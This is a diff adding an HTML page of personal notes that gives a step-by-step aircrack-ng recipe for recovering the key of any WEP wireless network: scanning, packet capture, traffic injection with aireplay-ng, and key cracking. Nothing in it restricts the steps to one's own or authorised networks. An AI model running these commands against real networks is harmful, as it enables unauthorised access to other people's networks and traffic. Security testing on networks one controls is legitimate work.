@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="generator" content="Docutils 0.5: http://docutils.sourceforge.net/" />
+<title>WLAN documentation</title>
+<link rel="stylesheet" href="../../css/print.css" type="text/css" />
+</head>
+<body>
+<div class="document">
+
+
+<div class="section" id="wlan-documentation">
+<h2>WLAN documentation</h2>
+<p>Documentation on all my experiments with WLAN networks</p>
+<div class="contents local topic" id="contents">
+<p class="topic-title first">Contents</p>
+<ul class="simple">
+<li><a class="reference internal" href="#cracking-a-wep-network" id="id1">Cracking a WEP network</a><ul>
+<li><a class="reference internal" href="#finding-the-bssid-and-channel" id="id2">Finding the BSSID and channel</a></li>
+<li><a class="reference internal" href="#collecting-data" id="id3">Collecting data</a></li>
+<li><a class="reference internal" href="#cracking-the-key" id="id4">Cracking the key</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#references" id="id5">References</a></li>
+</ul>
+</div>
+<div class="section" id="cracking-a-wep-network">
+<h3>Cracking a WEP network</h3>
+<p>This describes how to get the key of any WEP network using the <a class="reference external" href="http://www.aircrack-ng.org/doku.php">aircrack</a> suite
+of tools. The instructions below have been tested with the <tt class="docutils literal"><span class="pre">1.0_rc3</span></tt> version
+of <tt class="docutils literal"><span class="pre">aircrack-ng</span></tt>.</p>
+<div class="section" id="finding-the-bssid-and-channel">
+<h4>Finding the BSSID and channel</h4>
+<p>You first have to know exactly which access point you want to get the key from,
+and which channel it is broadcasting on. To do that, run (as root):</p>
+<pre class="literal-block">
+$ airodump-ng ra0
+</pre>
+<p>and note the value of the BSSID and channel fields of the network you want to
+access.</p>
+</div>
+<div class="section" id="collecting-data">
+<h4>Collecting data</h4>
+<p>Then start packet collection (as root):</p>
+<pre class="literal-block">
+$ airodump-ng -i -w crypted-packets -c $channel -d $bssid ra0
+</pre>
+<p>One may need to collect up to one million packets, which may take time. There is
+way to inject trafic to make it faster: while airodump is still running, launch
+(as root):</p>
+<pre class="literal-block">
+$ aireplay-ng -1 0 -a $bssid ra0
+</pre>
+<p>This only works if your wlan driver supports packet injection (for example the
+driver for the wlan card on the eee PC 901 does not). To see if it is supported,
+you can visit <a class="reference external" href="http://forum.aircrack-ng.org/">aircrack's forum</a>.</p>
+<p>Once this has been done, do:</p>
+<pre class="literal-block">
+$ aireplay-ng -3 -b $bssid ra0
+</pre>
+</div>
+<div class="section" id="cracking-the-key">
+<h4>Cracking the key</h4>
+<p>When enough packets have been collected by airodump, run:</p>
+<pre class="literal-block">
+$ aircrack-ng crypted-packets-01.ivs
+</pre>
+</div>
+</div>
+<div class="section" id="references">
+<h3>References</h3>
+<ul class="simple">
+<li><a class="reference external" href="http://www.askstudent.com/hacking/how-to-crack-a-wep-key-using-ubuntu/">How to crack a WEP key using Ubuntu</a>: describes the main ideas, but the
+command line has to be edited somehow.</li>
+<li><a class="reference external" href="http://cri.ch/linux/docs/sk0016.html">WLAN hacking</a>: describes the exploit and the techniques in more details,
+links to several pages of explainations, but not as easy to follow as the
+ubuntu tutorial.</li>
+</ul>
+</div>
+</div>
+</div>
+</body>
+</html>
